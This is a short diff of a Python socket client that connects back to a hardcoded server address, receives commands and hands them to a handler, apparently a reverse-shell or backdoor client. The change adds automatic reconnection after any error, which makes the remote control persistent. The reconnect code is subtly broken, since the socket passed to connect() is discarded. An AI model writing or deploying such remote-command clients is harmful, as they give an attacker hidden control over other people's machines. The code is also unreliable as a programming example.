@@ -26,7 +26,7 @@ host = "192.168.0.14"
 print("[+] Server: ", host, " Port: ", port)
 
 
-def connect():
+def connect(s):
     s = socket.socket()
     while True:
         print("Trying to connect to the server")
@@ -49,15 +49,15 @@ def execute_commands(s):
             command = s.recv(1024)
             command = command.decode()
             check_command(s,command)
-        except socket.error as socket_error:
-            print("Socket error: " + socket_error)
-            s.close()
-            s = ""
-            connect()
         except Exception as error_msg:
             print("Error: " + str(error_msg))
+            # reconnect to the server
+            s.close()
+            s = ""
+            connect(s)
 
 def main():
-    connect()
+    s = ""
+    connect(s)
 
 main()
